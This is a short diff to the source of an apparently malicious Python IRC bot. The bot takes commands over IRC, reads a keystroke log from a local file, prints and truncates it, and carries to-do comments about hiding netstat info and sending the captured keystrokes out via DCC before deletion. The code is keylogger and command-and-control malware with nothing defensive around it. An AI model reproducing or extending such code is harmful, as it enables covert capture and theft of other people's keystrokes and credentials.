@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# HIDE NETSTAT INFO --- READBUFFER NEEDS TO BE BIGGER, OR SEND VIA TCP. MISSING TEXT
+# HIDE NETSTAT INFO --- WRITE IRC CLIENT TO ENABLE DCC CHAT/SEND. 
 """
 This bot uses the SingleServerIRCBot class from irc.bot.  
 The bot enters a channel and listens for commands in private messages and channel traffic.  
@@ -101,11 +101,10 @@ class Bot(irc.bot.SingleServerIRCBot):
 
     # Translate and print the keylog to console. Once finished, deletes file.
     def keylogs(self):
-        irc = True
         evlog = '/opt/col_log/evlog.txt'
         log = open(evlog, 'r+')
         f = log.read()
-        kl = key.translate(f, irc)
+        kl = key.translate(f)
         log.truncate()
         # MUST ADD DCC SEND BEFORE DELETING!!!!!
         log.close()
